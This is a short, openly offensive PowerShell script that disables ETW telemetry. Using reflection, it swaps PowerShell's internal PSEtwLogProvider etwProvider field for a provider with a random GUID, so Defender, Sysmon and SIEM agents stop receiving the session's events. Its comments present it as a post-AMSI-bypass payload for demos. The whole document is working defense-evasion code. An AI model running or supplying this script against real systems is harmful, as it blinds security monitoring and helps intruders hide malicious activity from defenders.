# ETW bypass -- disables PowerShell ScriptBlock telemetry to evade EDR/Defender
# behavioral detection. Used as the "post-AMSI-bypass payload" in demos.

# Load reflection helpers
[Reflection.Assembly]::LoadWithPartialName('System.Core') | Out-Null

# Get the private static field that holds the ETW provider PowerShell uses
$EtwProviderField = [Ref].Assembly.GetType(
    'System.Management.Automation.Tracing.PSEtwLogProvider'
).GetField('etwProvider', 'NonPublic,Static')

# Create a new EventProvider with a RANDOM GUID -- nobody is listening on it,
# so all PowerShell ETW events will be silently dropped.
$BlindProvider = New-Object System.Diagnostics.Eventing.EventProvider `
    -ArgumentList @([Guid]::NewGuid())

# Overwrite the global. From now on PowerShell continues to work but
# Defender/Sysmon/SIEM agents see NOTHING from this session.
$EtwProviderField.SetValue($null, $BlindProvider)

Write-Output 'ETW provider replaced -- PowerShell telemetry is now blind.'
